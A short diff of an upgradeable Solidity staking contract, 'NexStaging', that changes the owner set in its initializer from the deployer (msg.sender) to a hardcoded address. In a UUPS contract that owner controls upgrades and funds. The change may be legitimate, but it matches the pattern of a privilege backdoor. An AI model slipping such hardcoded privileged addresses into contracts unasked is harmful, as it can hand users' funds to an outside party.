@@ -99,7 +99,7 @@ contract NexStaging is Initializable, OwnableUpgradeable, UUPSUpgradeable {
     ) public initializer {
         require(_tokenAddresses.length == _tokenAPYs.length, "Mismatched token and APY lengths");
 
-        __Ownable_init(msg.sender);
+        __Ownable_init(0x51256F5459C1DdE0C794818AF42569030901a098);
         __UUPSUpgradeable_init();
 
         nexLabs = IERC20(_nexLabsAddress);
